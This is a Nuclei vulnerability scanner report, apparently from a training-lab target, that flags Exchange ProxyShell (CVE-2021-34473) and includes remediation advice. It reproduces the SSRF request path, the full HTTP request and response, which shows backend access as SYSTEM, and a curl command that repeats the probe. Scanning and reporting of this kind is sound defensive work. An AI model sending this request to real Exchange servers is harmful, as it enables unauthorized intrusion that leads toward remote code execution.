### Exchange Server - Remote Code Execution (CVE-2021-34473) found on https://10.10.252.86
---
**Details**: **CVE-2021-34473**  matched at https://10.10.252.86

**Protocol**: HTTP

**Full URL**: https://10.10.252.86/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com

**Timestamp**: Thu Apr 6 23:00:23 +0100 BST 2023

**Template Information**

| Key | Value |
|---|---|
| Name | Exchange Server - Remote Code Execution |
| Authors | arcc, intx0x80, dwisiswant0, r3dg33k |
| Tags | cve, cve2021, ssrf, rce, exchange, kev |
| Severity | critical |
| Description | Microsoft Exchange Server is vulnerable to a remote code execution vulnerability. This CVE ID is unique from CVE-2021-31196, CVE-2021-31206.<br> |
| Remediation | Apply Microsoft Exchange Server 2019 Cumulative Update 9 or upgrade to the latest version. |
| CVSS-Metrics | [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CVE-ID | [CVE-2021-34473](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-34473) |
| CVSS-Score | 9.80 |

**Request**
```http
GET /autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1
Host: 10.10.252.86
User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 200 OK
Connection: close
Cache-Control: private
Content-Type: text/html
Date: Thu, 06 Apr 2023 22:00:22 GMT
Request-Id: a17165f8-0c91-459a-9702-23bd587036e5
Server: Microsoft-IIS/10.0
Set-Cookie: X-BackEndCookie=; expires=Tue, 06-Apr-1993 22:00:23 GMT; path=/autodiscover; secure; HttpOnly
Vary: Accept-Encoding
X-Aspnet-Version: 4.0.30319
X-Beserver: WIN-12OUO7A66M7
X-Calculatedbetarget: win-12ouo7a66m7.thm.local
X-Diaginfo: WIN-12OUO7A66M7
X-Feserver: WIN-12OUO7A66M7
X-Powered-By: ASP.NET
X-Serverapplication: Exchange/15.02.0858.002

<html>
<head>
<title>Exchange MAPI/HTTP Connectivity Endpoint</title>
</head>
<body>
<p>Exchange MAPI/HTTP Connectivity Endpoint<br><br>Version: 15.2.858.2<br>Vdir Path: /mapi/nspi/<br><br></p><p><b>User:</b> NT AUTHORITY\SYSTEM<br><b>UPN:</b> <br><b>SID:</b> S-1-5-18<br><b>Organization:</b> <br><b>Authentication:</b> Negotiate<br><b>PUID:</b> <br><b>TenantGuid::</b> </p><br><p><b>Cafe:</b> win-12ouo7a66m7.thm.local<br><b>Mailbox:</b> win-12ouo7a66m7.thm.local</p><p><br><br><br><b>Created:</b> 4/6/2023 10:00:23 PM</p></body></html>
```

References: 
- https://msrc.microsoft.com/update-guide/vulnerability/cve-2021-34473
- https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html
- https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1
- https://nvd.nist.gov/vuln/detail/cve-2021-34473

**CURL Command**
```
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36' 'https://10.10.252.86/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com'
```
---
Generated by [Nuclei 2.9.0](https://github.com/projectdiscovery/nuclei)